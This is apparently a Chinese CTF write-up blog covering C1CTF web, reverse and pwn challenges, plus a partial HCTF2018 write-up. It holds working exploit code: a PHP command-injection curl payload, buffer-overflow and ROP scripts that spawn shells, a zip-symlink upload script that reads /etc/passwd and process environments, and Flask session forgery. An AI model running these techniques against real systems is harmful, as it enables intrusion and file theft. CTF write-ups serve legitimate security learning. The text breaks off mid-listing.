<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line">error_reporting(E_ALL ^ E_WARNING);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$v1 = [<span class="string">'admin'</span>,<span class="string">'test'</span>];</span><br><span class="line">$v2 = $_POST[<span class="string">'v2'</span>];</span><br><span class="line">$number = <span class="number">1</span>;</span><br><span class="line">$v5=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($v2 === $v1 &amp; $v2[<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;<span class="comment">//There you can execute the command</span></span><br><span class="line">    </span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    $v4 = $_GET;</span><br><span class="line">    <span class="keyword">foreach</span>($v4 <span class="keyword">as</span> $key =&gt; $cmd)&#123;</span><br><span class="line">        <span class="keyword">if</span>($key == $system_function)&#123;</span><br><span class="line">            $v5 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>($v5 &amp;&amp; strlen($v3)&gt;<span class="number">11</span> &amp;&amp; $number == <span class="number">3</span>)&#123;</span><br><span class="line">            $system_function($cmd,$key); </span><br><span class="line">        &#125;</span><br><span class="line">        $number++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="string">'hhhhhhhhhhhhhhhh_exec.php'</span>);</span><br></pre></td></tr></table></figure>

<p>一步一步看代码, 一眼看是不可能进行利用的, 在 <code>if($v2 === $v1 &amp; $v2[0] != &#39;admin&#39;)</code> 常理是不可能绕过的, 但是看一下php版本, 也是前两天看youtube看到了这一个技巧, 在php5.5.9中会产生int溢出, 2^32 = 4294967296 会解析成0, 这样就可以绕过这一步.<br>POST输入v4, GET输入v3, 并且v3要比11个字符要长. </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($key == $system_function)&#123;</span><br><span class="line">    $v5 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双等于号用弱类型就可以绕过.<br>比如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"asdsadsad"</span>;</span><br><span class="line">$b = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> $a==$b;</span><br></pre></td></tr></table></figure>

<p>这时就会输出1.<br>v5,$v3就已经满足了, 只需要将命令作为第三组就可以执行命令, 最后payload：<br><code>curl &quot;http://212.64.89.186:9992/hhhhhhhhhhhhhhhh_exec.php/hhhhhhhhhhhhhhhh_exec.php?v3=aaaaaaaaaaaaaaaaaaaaa&amp;0=asd&amp;system=cat%20index.php&quot; -d &quot;v2[4294967296]=admin&amp;v2[1]=test&quot;</code></p>
<p>得到 flag{PhP_1S_Best_Lang}</p>
<h2 id="Reserve"><a href="#Reserve" class="headerlink" title="Reserve"></a>Reserve</h2><h3 id="0x01-iOS13"><a href="#0x01-iOS13" class="headerlink" title="0x01 iOS13"></a>0x01 iOS13</h3><p>改一下版本号安装到 iPhone 上, 不过, 我没有 iOS 设备啊, 那就….</p>
<p>把整个 ipa 拖入 ida 内,最后发现 <code>iOS13</code> 内有 <code>C1CTF&amp;#123;%s&amp;#125;</code>, 而 iOS13dyn 内有剩下的 flag</p>
<p>可以看到 0 是参数, 所以 %d 应该用 0 替代. </p>
<h3 id="0x02-Captcha"><a href="#0x02-Captcha" class="headerlink" title="0x02 Captcha"></a>0x02 Captcha</h3><p>如果当成 Misc 来做的话可以直接用CE修改, 改成只需要输入 1 个验证码就可以结束</p>
<h3 id="0x03-Adjacent"><a href="#0x03-Adjacent" class="headerlink" title="0x03 Adjacent"></a>0x03 Adjacent</h3><p>注意反编译后的这一条语句:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((<span class="keyword">unsigned</span> __int8)s[i + <span class="number">1</span>] ^ (<span class="keyword">unsigned</span> __int8)s[i]) != *(&amp;v5 + i))</span><br></pre></td></tr></table></figure>

<p>实际上就是把字符串中相邻两个字节进行异或, 前面的结果进行比较, 我们知道flag开头是 <code>C1CTF{xxxx}</code></p>
<p>就算不知道是 C 开头, 也知道是 <code>}</code> 结尾</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag2[<span class="number">31</span>] = &#123; <span class="number">0x72</span>,<span class="number">0x72</span>,<span class="number">0x17</span>,<span class="number">0x12</span>,<span class="number">0x3d</span>,<span class="number">0x23</span>,<span class="number">0x68</span>,<span class="number">0x42</span>,<span class="number">0x2d</span>,<span class="number">0x1e</span>,<span class="number">0x25</span>,<span class="number">0x0e</span>,<span class="number">0x0b</span>,<span class="number">0x22</span>,<span class="number">0x70</span>,<span class="number">0x5d</span>,<span class="number">0x1a</span>,<span class="number">0x2b</span>,<span class="number">0x3c</span>,<span class="number">0x2b</span>,<span class="number">0x29</span>,<span class="number">0x13</span>,<span class="number">0x2d</span>,<span class="number">0x66</span>,<span class="number">0x0f</span>,<span class="number">0x62</span>,<span class="number">0x2d</span>,<span class="number">0x2a</span>,<span class="number">0x29</span>,<span class="number">0x13</span>,<span class="number">0x14</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> flag[<span class="number">33</span>] = &#123; <span class="string">'C'</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    flag[i] = flag2[i<span class="number">-1</span>] ^ flag[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//"C1CTF&#123;X0r_AdjaC3nt_cHar_96TySzi&#125;"</span></span><br></pre></td></tr></table></figure>

<h3 id="0x04-encoding"><a href="#0x04-encoding" class="headerlink" title="0x04 encoding"></a>0x04 encoding</h3><p>这道题可以爆破, 爆破的方法就不在此说了. </p>
<p>第一部分是异或</p>
<p>第二步可以从 <code>sub_7FA</code> 得到这样的置换表：</p>
<p><code>nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ</code></p>
<p>然后</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">_BYTE \*__<span class="function">fastcall <span class="title">sub_A84</span><span class="params">(__int64 a1, _BYTE \*a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 i; <span class="comment">// [rsp+1Bh] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(v7 + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    \*v3++ = sub_7FA((<span class="keyword">unsigned</span> __int8)((<span class="keyword">int</span>)\*(<span class="keyword">unsigned</span> __int8 *)(v7 + a1) &gt;&gt; (v5 + <span class="number">2</span>)) | v4); <span class="comment">//舍弃 v7中的v5+2位</span></span><br><span class="line">    v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">7</span>;   <span class="comment">// mod 8 剩余位数</span></span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">      v4 |= ((<span class="number">1</span> &lt;&lt; i) &amp; *(<span class="keyword">unsigned</span> __int8 *)(v7 + a1)) &lt;&lt; (<span class="number">6</span> - v5);   <span class="comment">//取出v7中剩余的位数, v5位</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt;= <span class="number">5u</span> ) <span class="comment">// 不足五位向前取一位</span></span><br><span class="line">      ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v3;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看出这是base64, 反向编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">'nopqrstuvwxyzabcdefghijklm0123456789ABCDEFGHIJKL+/MNOPQRSTUVWXYZ'</span></span><br><span class="line">s = <span class="string">'KFjUWyZ592NvPU1CCa5xAIRVAa4CTEN6+bjwWlqm'</span></span><br><span class="line">a = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">    i = t.find(ch)</span><br><span class="line">    a += <span class="string">'&#123;0:0&gt;6b&#125;'</span>.format(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">if</span> i/<span class="number">8</span> % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += chr(int(a[i:i+<span class="number">8</span>],base=<span class="number">2</span>) ^ <span class="number">0xF9</span> )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(int(a[i:i+<span class="number">8</span>],base=<span class="number">2</span>) ^ <span class="number">0xA4</span> )</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#C1CTF&#123;th1s_Bas364_is_BuD9ApUy&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="0x05-Activate"><a href="#0x05-Activate" class="headerlink" title="0x05 Activate"></a>0x05 Activate</h3><p>UTF16编码：</p>
<p><code>激活码无效</code> -&gt; <code>C0 6F 3B 6D 01 78 E0 65 48 65</code></p>
<p>找到激活码无效这一字符串前面的分支, 下个断点</p>
<p>走红线 “激活完成”</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x01-Chekin"><a href="#0x01-Chekin" class="headerlink" title="0x01 Chekin"></a>0x01 Chekin</h3><p>这其实算密码学题目吧….   </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">"your ip address"</span>,<span class="number">9990</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'2'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'10'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'3544388184383369539\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'2'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'11'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">payload = <span class="string">b'56\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'0'</span>+<span class="string">b'\n'</span></span><br><span class="line">sock.sendall(payload)</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br><span class="line">print(sock.recv(<span class="number">100</span>))</span><br></pre></td></tr></table></figure>

<h3 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h3><p>主要是调用 <code>00402360</code> 处的后门</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span>  </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line">    s.connect((<span class="string">"your ip address"</span>,<span class="number">9990</span>))  </span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># 选择写入内容</span></span><br><span class="line">    payload = <span class="string">b'1'</span></span><br><span class="line">    <span class="comment"># 向服务器发送数据  </span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">2048</span>))</span><br><span class="line">    <span class="comment"># 写入字符串%p</span></span><br><span class="line">    payload = <span class="string">b'%p'</span></span><br><span class="line">    </span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">    <span class="comment"># 读取地址%p</span></span><br><span class="line">    payload = <span class="string">b'2'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment">#'Here is your string:\r\n00D72230'</span></span><br><span class="line">    r = s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>)</span><br><span class="line">    print(r)</span><br><span class="line">    <span class="comment"># 选择写入</span></span><br><span class="line">    payload = <span class="string">b'1'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line">    <span class="comment"># 写入Payload 覆盖返回值, 获取shell</span></span><br><span class="line">    payload = <span class="string">b'A'</span>*<span class="number">20</span>+(int(r[<span class="number">-8</span>:],base=<span class="number">16</span>)+<span class="number">176</span>).to_bytes(<span class="number">4</span>,<span class="string">'little'</span>)</span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'type flag.txt'</span></span><br><span class="line">    s.sendall((payload + <span class="string">b'\n'</span>))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    print(s.recv(<span class="number">2048</span>).decode(<span class="string">'gbk'</span>))</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<h3 id="0x03-upgrade"><a href="#0x03-upgrade" class="headerlink" title="0x03 upgrade"></a>0x03 upgrade</h3><p>直接看脚本的注释或者看线下的解释吧…  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./pwn2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'1\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line">p.send(<span class="string">'15\n'</span>)</span><br><span class="line"><span class="comment">#print(p.recv())</span></span><br><span class="line">t = p.recv()</span><br><span class="line">print(t)</span><br><span class="line">libc_main_ret = [int(s) <span class="keyword">for</span> s <span class="keyword">in</span> t.split() <span class="keyword">if</span> s.isdigit()][<span class="number">0</span>]</span><br><span class="line">print(libc_main_ret)</span><br><span class="line"></span><br><span class="line">libc_main_base = libc_main_ret - <span class="number">0x021B97</span></span><br><span class="line"></span><br><span class="line">libc_pop_rdi = libc_main_base + <span class="number">0x02155f</span> </span><br><span class="line">libc_pop_rdx_rsi = libc_main_base + <span class="number">0x01306d9</span></span><br><span class="line"></span><br><span class="line">libc_bin_sh = libc_main_base + <span class="number">0x01b3e9a</span></span><br><span class="line">libc_int_80 = libc_main_base + <span class="number">0x01b3e9a</span></span><br><span class="line">libc_execve =  libc_main_base + <span class="number">0xE4E30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0x000000000002155f : pop rdi ; ret A</span></span><br><span class="line"><span class="comment">#0x0000000000023e6a : pop rsi ; ret B</span></span><br><span class="line"><span class="comment">#0x0000000000001b96 : pop rdx ; ret C</span></span><br><span class="line"><span class="comment">#0x000000000003eb0b : pop rcx ; ret D</span></span><br><span class="line"><span class="comment">#0x00000000001306d9 : pop rdx ; pop rsi ; ret</span></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n15\n'</span>)</span><br><span class="line">p.send(str(libc_pop_rdi)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n16\n'</span>)</span><br><span class="line">p.send(str(libc_bin_sh)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n17\n'</span>)</span><br><span class="line">p.send(str(libc_pop_rdx_rsi)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n18\n'</span>)</span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n19\n'</span>)</span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'2\n20\n'</span>)</span><br><span class="line">p.send(str(libc_execve)+<span class="string">'\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">'0\n'</span>)</span><br><span class="line">print(p.recv())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>c1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF2018 WriteUp</title>
    <url>/2018/11/12/hctf2018-writeup/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2019/03/08/5c82768fe4d67.jpg" alt=""><br>和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜… </p>
<a id="more"></a>

<h2 id="0x01-admin"><a href="#0x01-admin" class="headerlink" title="0x01 admin"></a>0x01 admin</h2><p>在改密码的地方有 hint,<br><img src="https://i.loli.net/2019/03/08/5c8276960e9a1.jpg" alt="">  </p>
<p>得到源码后第一个发现的是可能存在条件竞争, 题目里面是先将 <code>session</code> 里面的 <code>name</code> 给改了再去验证密码的  </p>
<p><img src="https://i.loli.net/2019/03/08/5c82769adc533.jpg" alt="">  </p>
<p>但之后发现 <code>flask</code> 不是像 <code>php</code> 一样将 <code>session</code> 保存在服务端, 而是保存在 <code>cookies</code> 里面的, 所以这里其实是不存在条件竞争的. 最后发现其实 <code>SECRET_KEY</code> 已经给我们了, 完全可以伪造 <code>session</code>.  </p>
<p><img src="https://i.loli.net/2019/03/08/5c82769e190bc.jpg" alt="">  </p>
<p>这里估计是怕太明显, <code>environ</code> 里面是没 <code>SECRET_KEY</code> 的 (看了其他的 WriteUp 其实就是出题人环境没配好 233), 所以直接用 <code>cjk123</code> 就可以了. 在 <a href="https://github.com/noraj/flask-session-cookie-manager/stargazers" target="_blank" rel="noopener">github</a> 上可以找到用 <code>SECRET_KEY</code> 来生成 <code>session</code> 的小工具, 先解码看看结构后改一下 <code>name</code> 就可以了. 最后把现在的换成生成的 <code>session</code> 访问 <code>index</code> 就可以 get flag 了, 不过这 flag… 是我们非预期解还是这个题目是中间没做完强行改了一下放出来的 0.0  </p>
<p><img src="https://i.loli.net/2019/03/08/5c8276a0c91d9.jpg" alt=""></p>
<h2 id="0x02-hide-and-seek"><a href="#0x02-hide-and-seek" class="headerlink" title="0x02 hide and seek"></a>0x02 hide and seek</h2><p>通过 <code>cookie</code> 可以看出来跟上一题一样是 <code>flask</code>, 题目这么强调 <code>zipfile</code>, 所以肯定跟这个有关, 在谷歌上搜到一个通过在里面加 <code>../../../file</code> 的文件来导致目录穿越的, 但是试了下并没有用. 最后还是师傅想到用软链试试, 结果正是如此, 可以通过软链来任意文件读取, 但比较麻烦的是不像 <code>php</code>, 直接在 <code>URL</code> 上就给你文件名, 我们得想办法把文件名给找到读出源码才能下一步. 这里写个 <code>python</code> 脚本来简化我们的工作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">z_info = zipfile.ZipInfo(<span class="string">"symlink"</span>)</span><br><span class="line">z_info.external_attr = <span class="number">2717843456</span> <span class="comment"># Magic Number. Meaning this is a symlink.</span></span><br><span class="line">z_file = zipfile.ZipFile(<span class="string">"test.zip"</span>, mode=<span class="string">"w"</span>)</span><br><span class="line">z_file.writestr(z_info, <span class="string">f"/etc/passwd"</span>)</span><br><span class="line">z_file.close()</span><br><span class="line"></span><br><span class="line">cookie = open(<span class="string">"pysession"</span>).read()</span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.cookies[<span class="string">"session"</span>] = cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">"the_file"</span> : (<span class="string">"test.zip"</span>, open(<span class="string">"test.zip"</span>, <span class="string">"rb"</span>), <span class="string">"application/zip"</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = sess.post(<span class="string">"http://hideandseek.2018.hctf.io/upload"</span>, files=files)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res.text:</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line">open(<span class="string">"pysession"</span>, <span class="string">"w"</span>).write(sess.cookies[<span class="string">"session"</span>])</span><br></pre></td></tr></table></figure>

<p>将 <code>/etc/passwd</code> 换成想读的文件就可以了, 需要提前将一个登陆过的 <code>session</code> 写在 <code>pysession</code> 里面. 然后在这里困了挺久, 读了一圈系统配置也没找到提示, 最后师傅想到可以爆破 <code>/proc/{pid}/environ</code> 来爆破自己这个进程的环境变量来得到 <code>UWSGI_INI</code> 位置 (后来知道其实 <code>/proc/self/environ</code> 就可以了 不用爆破), 我们得到的是  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UWSGI_CHEAPER&#x3D;2</span><br><span class="line">LANG&#x3D;C.UTF-8</span><br><span class="line">HOSTNAME&#x3D;309ee00b10f9</span><br><span class="line">NJS_VERSION&#x3D;1.13.12.0.2.0-1~stretch</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_PROCESSES&#x3D;16</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">NGINX_VERSION&#x3D;1.13.12-1~stretch</span><br><span class="line">PWD&#x3D;&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg</span><br><span class="line">STATIC_URL&#x3D;&#x2F;</span><br><span class="line">staticHOME&#x3D;&#x2F;root</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;auto</span><br><span class="line">STATIC_INDEX&#x3D;0PYTHON_VERSION&#x3D;3.6.6</span><br><span class="line">SHLVL&#x3D;0</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;static</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;18.1</span><br></pre></td></tr></table></figure>

<p><code>INI</code> 中有个 <code>module</code> 值, 就是 py 脚本的位置, 我们得到的值是 <code>hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</code>, 可以想到文件路径就是 <code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>, 得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"> 